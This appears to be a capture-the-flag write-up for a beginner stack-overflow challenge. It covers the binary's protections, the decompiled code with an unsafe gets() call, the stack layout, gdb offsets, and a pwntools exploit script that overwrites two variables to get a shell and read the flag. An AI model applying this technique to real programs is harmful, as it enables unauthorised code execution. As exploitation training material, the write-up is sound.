# &#35; chall_01

#### &#42; purpose
1. this level just try to stack overflow.
2. need to are overwritten with (local_c = 0xfacade) and (local_10 = 0xfacade)


#### &#42; execute
```bash
## 1 file
$ $ ls chall_01
chall_01

## 64-bit LS, dynamically linked and not stripped
$ file chall_01
chall_01: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9f3747c779debb213297dff6495262222bf44bd5, for GNU/Linux 3.2.0, not stripped

## Full RELRO and PIE enabled
$ checksec --file=./chall_01
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   69) Symbols	  No	0		2		./chall_01

## just input twice
$ ./chall_01
Long time ago, you called upon the tombstones
AAAAAAAA
BBBBBBBB
$

```

#### &#42; decompile using ghidra
```bash
## need to match values
void main(void)

{
  char local_68 [64];
  char local_28 [24];
  int local_10;
  int local_c;
  
  puts("Long time ago, you called upon the tombstones");
  fgets(local_28,0x13,stdin);
  gets(local_68);
  if (local_c == 0xfacade) {
    system("/bin/sh");
  }
  if (local_10 == 0xfacade) {
    system("/bin/sh");
  }
  return;
}

```

#### &#42; structure of stack
```bash
local_68[64] + local_28[24] + local_10[4] + local_c[4]
=> buf[88] + local_10[4] + local_c[4]


```

#### &#42; payload(python)
```python
payload  = b"A"*88
payload += p32(0xfacade)
payload += p32(0xfacade)

```

#### &#42; analysis binary using gdb
```bash
gef➤  x/s 0x00007ffdd6daa170
0x7ffdd6daa170:	'B' <repeats 88 times>, "CCCCDDDD"

gef➤  x/8xg $rbp-4
0x7ffdd6daa1cc:	0x0000000044444444	0x8275b0b300000000
0x7ffdd6daa1dc:	0x8296062000007f95	0xd6daa2c800007f95
0x7ffdd6daa1ec:	0x0000000000007ffd	0xfa99d1a900000001
0x7ffdd6daa1fc:	0xfa99d22000005563	0xaa15615600005563
gef➤  x/8xg $rbp-8
0x7ffdd6daa1c8:	0x4444444443434343	0x0000000000000000
0x7ffdd6daa1d8:	0x00007f958275b0b3	0x00007f9582960620
0x7ffdd6daa1e8:	0x00007ffdd6daa2c8	0x0000000100000000
0x7ffdd6daa1f8:	0x00005563fa99d1a9	0x00005563fa99d220
gef➤

gef➤  p/d 0x7ffdd6daa1c8-0x00007ffdd6daa170
$2 = 88

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = './chall_01'
conn = process(filename)

print( conn.recvuntil("Long time ago, you called upon the tombstones\n") )

payload  = b"Z"*4
conn.sendline(payload)

with open("payload", "wb") as fd:
    fd.write(payload+"\n")

payload  = b"A"*88
payload += p32(0xfacade)
payload += p32(0xfacade)

conn.send(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()


```


#### &#42; try to exploit
```bash
$ python2 exp.py
[+] Starting local process './chall_01': pid 2275
Long time ago, you called upon the tombstones

[*] Switching to interactive mode
$ 
$ cat flag.txt
sun{eternal-rest-6a5ee49d943a053a}
$

```
